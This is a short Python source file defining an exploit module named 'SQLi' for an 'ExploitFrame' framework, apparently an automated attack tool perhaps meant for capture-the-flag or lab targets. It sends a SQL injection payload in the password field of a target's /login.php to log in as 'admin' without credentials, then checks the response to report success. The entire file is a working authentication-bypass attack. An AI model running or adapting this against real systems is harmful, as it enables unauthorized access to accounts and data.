from ExploitFrame import ExploitFrame
import requests


class Exploit(ExploitFrame):
    def __init__(self, serviceInfo):
        self.name = 'SQLi'
        self.output = None
        ExploitFrame.__init__(self, serviceInfo)

    def exploit(self):
        url = "http://{}/login.php".format(self.serviceInfo.serviceHost)
        try:
            r = requests.post(url, data={'username': 'admin', 'password': """asdf' OR '1==1';  -- """})
            self.output = r.text
        except: # NOQA
            self.output = None

    def exploitSuccess(self):
        print "Exploit Output: {}".format(self.output)
        if self.output and "admin" in self.output:
            return True
        return False
